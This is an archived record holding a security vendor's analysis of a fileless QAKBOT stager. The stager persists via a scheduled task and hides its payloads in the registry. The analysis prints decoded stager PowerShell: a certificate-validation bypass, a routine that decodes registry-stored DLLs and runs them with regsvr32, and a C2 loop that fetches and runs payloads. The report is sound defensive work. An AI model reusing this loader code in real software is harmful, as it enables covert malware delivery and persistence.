{
    "id": "3f1bdfc5-9c21-4f7c-9bec-6089bc8bf815",
    "created_at": "2023-01-12T15:05:57.010521Z",
    "updated_at": "2025-03-27T02:05:55.083945Z",
    "deleted_at": null,
    "sha1_hash": "6e6ae13729b7876397f9478e588b5ae4ae562b09",
    "title": "2021-12-17 - Staging a Quack- Reverse Analyzing a Fileless QAKBOT Stager",
    "authors": "",
    "file_creation_date": "2022-05-27T22:09:23Z",
    "file_modification_date": "2022-05-27T22:09:23Z",
    "file_size": 210036,
    "plain_text": "# Staging a Quack: Reverse Analyzing a Fileless QAKBOT Stager\n\n**[trendmicro.com/en_us/research/21/l/staging-a-quack-reverse-analyzing-fileless-qakbot-stager.html](https://www.trendmicro.com/en_us/research/21/l/staging-a-quack-reverse-analyzing-fileless-qakbot-stager.html)**\n\nDecember 17, 2021\n\n[We recently published how Squirrelwaffle emerged as a loader using two exploits in a recent](https://www.trendmicro.com/en_us/research/21/k/Squirrelwaffle-Exploits-ProxyShell-and-ProxyLogon-to-Hijack-Email-Chains.html)\nspam campaign in the Middle East. Further monitoring and analysis from our incident\nresponse and extended detection and response teams (IR/XDR) found that one of\n[Squirrelwaffle’s payloads includes QAKBOT, a banking trojan and infostealer that](https://www.trendmicro.com/en_us/research/21/k/qakbot-loader-returns-with-new-techniques-and-tools.html)\ncybercriminals have been using since 2007.\n\nDuring one of our threat hunting initiatives, we found a fileless QAKBOT stager capable of\nachieving persistence on its own. Furthermore, while QAKBOT is one of the payloads it\nstages filelessly in the registry, the stager is also capable of staging for more than one\n[malware, a capability that can likely be abused for more campaigns in the future.](https://www.trendmicro.com/en_us/research/21/k/qakbot-loader-returns-with-new-techniques-and-tools.html)\n\nTechnical details\n\n\n-----\n\nFigure 1. Infection chain and timeline\nWe found a suspicious PowerShell execution in an infected system in the following form:\n\nFigure 2. PowerShell execution observed\n\nWhen the code is obfuscated via base64, the command line parameter is usually long and\nnoticeable via XDR. But this specific execution is noticeably short and reads filelessly in the\nregistry despite its base64 encoding.\n\nUsing Trend Micro™ Vision One™ with Managed XDR’s progressive root cause analysis\n(RCA), we were able to trace back the execution to the legitimate process services.exe. It\nturns out that the suspicious PowerShell execution is triggered via a scheduled task.\n\n\n-----\n\nFigure 3. Tracking the suspicious execution with Trend Micro Vision One\n\nFigure 4. A scheduled task\n\ntriggered the PowerShell execution.\nThe PowerShell command is an example of a fileless technique wherein the actual command\nis stored in the registry. In this case, it was stored in the registry entry\nHKCU:\\SOFTWARE\\Uiggvsbhwbcvhom).vqaryay, again encoded in base 64.\n\nBreaking down the decrypted strings\n\nWe decrypted and analyzed the encoded string and broke them down. The code’s variables\nseem to be obfuscated via a randomizer, likely to circumvent detection to a certain extent.\n\n$KtdH = \"{E6CF5F45-43D0-4514-96DE-151BD04A9079}\" <-- Mutex Name\n\n$PgZYjDK = \"qafsdb378960\" <-- URL parameter (seems to be an ID)\n\n$d_IP = \"/zkr\" <-- URL path\n\n$LngwgFRytJ = \"jhysoq\" <-- Registry Entry 1\n\n$awwWcsGQX = \"gqdmzka\" <-- Registry Entry 2\n\n$g_JXBUAMH = \"irwtoakzd\" <-- Registry Entry 3\n\n$WQudUrNwDr = \"daedvnjlph\" <-- Registry Entry 4 (Date Entry)\n\n$tvDQbLr = \"HKCU:\\SOFTWARE\\Uiggvsbhwbcvhom\" <-- Registry Key\n\nThe next set of code sets PowerShell to skip secure sockets layer (SSL) certificate checks,\n[bypassing the inherent security protocol.](https://til.intrepidintegration.com/powershell/ssl-cert-bypass)\n\n\n-----\n\nadd-type @\"\n\nusing System.Net;\n\nusing System.Security.Cryptography.X509Certificates;\n\npublic class TrustAllCertsPolicy : ICertificatePolicy {\n\npublic bool CheckValidationResult(\n\nServicePoint srvPoint, X509Certificate certificate,\n\nWebRequest request, int certificateProblem) {\n\nreturn true;\n\n}\n\n}\n\n\"@\n\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n\nThe string then checks for mutex to ensure a single execution, which is the usual for\nmalware implementations. It also checks if the date is already set in registry entry 4. While\nthe exact date is insignificant, it serves as a marker for this fileless malware. If the marker is\nnot yet set, it will proceed with a drop-and-execute routine. Otherwise, it skips a routine.\n\n\n-----\n\nfunction UQTV()\n\n{\n\n$MwmmBxnVjO = Get-Random\n\n$RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n\nif ($RBnYwaG) {\n\n$_f_zhkPw = \"$env:TEMP\\\\$($MwmmBxnVjO)1.dll\"\n\n$fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n\n[System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n\nStart-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n\n} else {\n\n}\n\n$OlKwHqqEa = (Get-ItemProperty -Path $tvDQbLr).$awwWcsGQX\n\nif ($OlKwHqqEa) {\n\n$_f_zhkPw = \"$env:TEMP\\\\$($MwmmBxnVjO)2.dll\"\n\n$fPsS = [System.Convert]::FromBase64String($OlKwHqqEa)\n\n[System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n\nStart-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n\n} else {\n\n}\n\n}\n\nDepending on which registry entry is present (either registry entry 1 or 2), the string will drop\nand execute via regsvr32.exe a dynamic link library (DLL) file that was filelessly stored in\neither registry entry 1 or 2. We observed the DLL file is a QAKBOT variant.\n\nAt this point, it’s easy to assume that the stager is done since it has already dropped the\nmain payload. We observed that at this stage, it has only performed half of its purpose.\nContinuing with the decrypted code, we see this:\n\n\n-----\n\n$PNpOl = (Get-ItemProperty -Path $tvDQbLr).$g_JXBUAMH\n\nif (!$PNpOl) {\n\nexit\n\n}\n\n$mbATsNmtaw =\n\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($PNpOl))\n\n$anvsPJMJpe = 0;\n\n$DXSMgDi = $mbATsNmtaw.Split(\";\")\n\nforeach ($qtNuK_ in $DXSMgDi) {\n\n__NOxzyOQT $qtNuK_\n\nif ($global:rcxEcF -eq 1) {\n\nbreak\n\n}\n\n$anvsPJMJpe++\n\n}\n\nexit 0\n\nThe stager reads registry entry 3, and the content of this registry is another encoded string.\nWhen decrypted, the string is a list of combined IP addresses and ports. Configured in the\nmemory, the stager would have access to the URL format of hxxps[:]//<IP>:<Port>/zkr?\nn=qafsdb378960, where it would take three parameters:\n\nThe first parameter is for the switch case\n\n1. Execute via regsvr32.exe\n2. Execute via Start-Process (exe)\n3. Execute via invoke-expression (IEX)\n4. Execute via cmd.exe\n5. Execute via Start-Process (bat)\n6. Execute via Start-Process (vbs)\n\nThe second parameter is for error handling.\nThe third parameter is for the content of the PE file to be downloaded and executed.\n\nConclusion\n\n\n-----\n\nWhile we observed this fileless stager only deploying QAKBOT, the stager also serves as a\nstager for other malware. It also achieves persistence via a scheduled task, which means it\ncan also deploy multiple types of malware as deemed necessary by the cybercriminals\nbehind this stager, with each malware execution triggered with the scheduled task.\n\nThere were instances where QAKBOT has tried to hide its tracks by being fileless. However,\nthis is the first time we have encountered this kind of fileless stager with persistence, and\n[having the capability to move laterally and download other types of malware such as](https://www.bleepingcomputer.com/news/security/microsoft-exchange-servers-hacked-in-internal-reply-chain-attacks/)\nransomware. Security teams are advised to reinforce and enable their monitoring\nmechanisms for better visibility of fileless malware artifacts, suspicious variables, and\nmalicious processes.\n\nTrend Micro solutions\n\n[Users can also opt to protect systems through managed detection and response (MDR),](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/server-protect.html)\nwhich enables the expertise of skilled cybersecurity personnel capable of reading at and\nbetween data gathered by advanced artificial intelligence and machine learning technology\nto correlate and prioritize threats, determining if they are part of a larger attack. Combined\nwith the visibility to track and monitor both malicious and legitimate processes abused for\nfileless threats and routines in siloed systems, MDR can detect threats before they are\nexecuted, preventing further compromise and mitigating the risks of an attack’s lateral\nspread.\n\nIndicators of Compromise (IOCs)\n\nView the full list of IOCs [here.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/21/l/staging-a-quack-reverse-analyzing-a-fileless-qakbot-stager/IOCs-staging-a-quack-reverse-analyzing-fileless-QAKBOT-stager.txt)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-17 - Staging a Quack- Reverse Analyzing a Fileless QAKBOT Stager.pdf"
    ],
    "report_names": [
        "2021-12-17 - Staging a Quack- Reverse Analyzing a Fileless QAKBOT Stager.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535957,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1653689363,
    "ts_modification_date": 1653689363,
    "files": {
        "pdf": "https://archive.orkl.eu/6e6ae13729b7876397f9478e588b5ae4ae562b09.pdf",
        "text": "https://archive.orkl.eu/6e6ae13729b7876397f9478e588b5ae4ae562b09.txt",
        "img": "https://archive.orkl.eu/6e6ae13729b7876397f9478e588b5ae4ae562b09.jpg"
    }
}